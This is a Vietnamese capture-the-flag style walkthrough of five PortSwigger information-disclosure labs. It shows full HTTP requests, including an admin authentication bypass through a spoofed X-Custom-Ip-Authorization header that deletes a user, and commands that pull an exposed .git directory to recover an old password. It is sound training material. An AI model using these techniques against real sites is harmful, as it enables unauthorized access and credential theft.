# Information disclosure

# **Lab: Information disclosure in error messages**

[Lab: Information disclosure in error messages | Web Security Academy](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages)

- Thực hiện xem một bài viết bất kỳ
- Trong phần mềm Burpsuite, thực hiện sửa tham số `postId` thành giá trị chứa ký tự không phải số. Quan sát response trả về chứa version
    - Request
        
        ```jsx
        GET /product?productId=1;; HTTP/2
        Host: 0a1e0080045814d1822634ba008f00fc.web-security-academy.net
        Cookie: session=O5eFhGlzBSQVfBsEoShYtrxq3SmucOp3
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0a1e0080045814d1822634ba008f00fc.web-security-academy.net/
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        ```
        
        ![image.png](Information%20disclosure/image.png)
        
- Submit version lấy được. Hoàn thành giải lab
    
    ![image.png](Information%20disclosure/image%201.png)
    

# **Lab: Information disclosure on debug page**

[Lab: Information disclosure on debug page | Web Security Academy](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page)

- Thực hiện truy cập vào web
- Nhấn tổ hợp phím `Ctrl+U` (hoặc view source)
- Quan sát thấy lộ lọt đường dẫn đến trang debug
    
    ![image.png](Information%20disclosure/image%202.png)
    
- Truy cập vào trang này, lấy được secret key. Thực hiện submit hoàn thành giải lab
    
    ![image.png](Information%20disclosure/image%203.png)
    
    ![image.png](Information%20disclosure/image%204.png)
    

# **Lab: Source code disclosure via backup files**

[Lab: Source code disclosure via backup files | Web Security Academy](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files)

- Thực hiện fuzzing ra file `robots.txt`
    
    ![image.png](Information%20disclosure/image%205.png)
    
- Thực hiện truy cập vào trang `/backup`. Quan sát thấy có file backup
    
    ![image.png](Information%20disclosure/image%206.png)
    
- Thực hiện đọc file. Quan sát thấy có mật khẩu cũng chính là solution cần submit. Thực hiện submit hoàn thành giải lab
    
    ![image.png](Information%20disclosure/image%207.png)
    
    ![image.png](Information%20disclosure/image%208.png)
    

# **Lab: Authentication bypass via information disclosure**

[Lab: Authentication bypass via information disclosure | Web Security Academy](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass)

- Thực hiện truy cập vào web
- Thử truy cập vào path `admin` nhận được response chỉ local user được vào trang này
    
    ![image.png](Information%20disclosure/image%209.png)
    
- Thực hiện bắt request gửi tới API `/admin` . Thêm header `X-Custom-Ip-Authorization: 127.0.0.1` . Quan sát response trả về là admin panel
    
    ![image.png](Information%20disclosure/image%2010.png)
    
- Thực hiện xóa user. Trong phần mềm Burpsuite, thực hiện bổ sung header cho request này. Xóa user thành công và hoàn thành giải lab
    - Request
        
        ```jsx
        GET /admin/delete?username=carlos HTTP/2
        Host: 0a1100b903bd313c80213a2a00c90085.web-security-academy.net
        Cookie: session=iURaCoivkR4CSfyScQgMitnESrYsIB0j
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0a1100b903bd313c80213a2a00c90085.web-security-academy.net/admin
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        X-Custom-Ip-Authorization: 127.0.0.1
        
        ```
        
    - POC
        
        ![image.png](Information%20disclosure/image%2011.png)
        
    
    ![image.png](Information%20disclosure/image%2012.png)
    

# **Lab: Information disclosure in version control history**

[Lab: Information disclosure in version control history | Web Security Academy](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)

- Trước hết thực hiện fuzzing bằng dirsearch thì thấy đường dẫn git bị lộ lọt
    
    ![image.png](Information%20disclosure/image%2013.png)
    
- Thực hiện lấy `.git` về bằng lệnh sau:
    - Payload
        
        ```jsx
        wget -r https://0ad800ee045c853d80aca84b00e700fb.web-security-academy.net/.git
        ```
        
- Thực hiện xem lịch sử commit
    - Payload
        
        ```jsx
        git log
        ```
        
    - Response
        
        ![image.png](Information%20disclosure/image%2014.png)
        
- Quay lại commit chưa remove password
    - Payload
        
        ```jsx
        git checkout c0055b238428d869f7312d55655e92a7889bcd8d
        ```
        
    - Response
        
        ![image.png](Information%20disclosure/image%2015.png)
        
- Thực hiện login và xóa user thành công. Hoàn thành giải lab
    
    ![image.png](Information%20disclosure/image%2016.png)